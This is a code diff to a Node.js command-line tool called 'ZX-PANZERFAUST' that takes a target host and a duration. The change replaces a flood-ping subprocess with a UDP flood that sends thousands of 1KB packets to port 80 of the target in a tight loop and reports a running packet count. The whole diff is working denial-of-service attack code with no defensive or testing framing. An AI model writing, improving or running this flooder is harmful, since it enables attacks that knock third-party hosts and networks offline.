@@ -1,4 +1,4 @@
-const { spawn } = require('child_process');
+const dgram = require('dgram');
 const [target, time] = process.argv.slice(2);
 
 if (!target || !time) {
@@ -6,30 +6,32 @@ if (!target || !time) {
     process.exit(1);
 }
 
-const cmd = spawn('ping', ['-f', '-i', '0.1', '-w', time, target]);  // Flood ping
-
+const socket = dgram.createSocket('udp4');
 let pings = 0;
+const endTime = Date.now() + (parseInt(time) * 1000);
 
-const logPings = () => {
-    process.stdout.write(`\rZX-PANZERFAUST pings: ${pings}`);  // Overwrite every 2 seconds
+// Make a dummy payload
+const payload = Buffer.alloc(1024, 'X'); // 1KB of 'X'
+
+const spam = () => {
+    if (Date.now() > endTime) {
+        process.stdout.write(`\nZX-PANZERFAUST DONE\nTotal pings: ${pings}\n`);
+        process.exit(0);
+    }
+
+    // Blast like crazy
+    for (let i = 0; i < 1000; i++) {
+        socket.send(payload, 0, payload.length, 80, target); // UDP port 80
+        pings++;
+    }
+
+    setImmediate(spam);
 };
 
-cmd.stdout.on('data', () => {
-    pings++;
-});
+// Logging every 2s, overwrite-style
+setInterval(() => {
+    process.stdout.write(`\rZX-PANZERFAUST pings: ${pings}`);
+}, 2000);
 
-cmd.stderr.on('data', (data) => {
-    console.error(`error: ${data}`);
-});
-
-cmd.on('exit', (code) => {
-    console.log(`\nProcess exited with code ${code}`);
-});
-
-process.on('SIGINT', () => {
-    cmd.kill();
-    console.log(`\n--- ZX-PANZERFAUST OFF ---\npings: ${pings}`);
-});
-
-// Log every 2 seconds
-setInterval(logPings, 2000);
+// GO TIME
+spam();
